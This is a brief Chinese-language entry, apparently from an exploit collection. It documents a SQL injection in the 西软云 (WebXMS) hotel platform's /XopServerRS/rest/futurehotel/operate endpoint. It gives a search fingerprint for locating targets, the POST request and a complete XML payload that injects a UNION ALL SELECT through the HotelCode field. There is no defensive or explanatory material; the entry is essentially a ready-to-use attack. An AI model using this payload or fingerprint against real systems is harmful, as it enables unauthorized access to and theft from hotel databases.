# 西软云operate存在SQL注入漏洞

西软云 ｜ SQL注入 ｜ —
- **指纹**：`body="WebXMS"`
- **请求**：`POST /XopServerRS/rest/futurehotel/operate HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<UpdateRQ>
<AuthenticationToken>
<Token>test-token</Token>
</AuthenticationToken>
<TaoBaoOrderId>0</TaoBaoOrderId>
<OrderId>ORD123</OrderId>
<RequestID>REQ-123</RequestID>
<HotelCode>H002' UNION ALL SELECT CONCAT(CONCAT('qbbjq','HwNO'),'qpzxq'),NULL-- PoVf</HotelCode>
<OperateType>9</OperateType>
<Action>0</Action>
<DisplayText>Cancel invoice request</DisplayText>
<Extensions/>
</UpdateRQ>
```
- **响应特征**：200